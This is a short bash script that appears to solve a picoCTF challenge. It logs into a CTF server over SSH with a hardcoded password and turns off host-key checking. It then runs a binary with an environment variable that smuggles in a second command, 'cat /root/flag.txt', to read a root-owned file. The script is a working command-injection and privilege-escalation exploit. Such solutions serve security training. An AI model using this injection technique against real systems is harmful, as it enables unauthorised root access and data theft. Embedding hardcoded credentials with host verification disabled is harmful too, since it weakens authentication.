#!/usr/bin/bash

USERNAME='ctf-player'
HOST='saturn.picoctf.net'
PASSWORD='fd7746b4'
PORT=58262

SOLUTION='export SECRET_DIR="/root; cat /root/flag.txt"; ./bin'

sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no ${USERNAME}@${HOST} -p ${PORT} ${SOLUTION}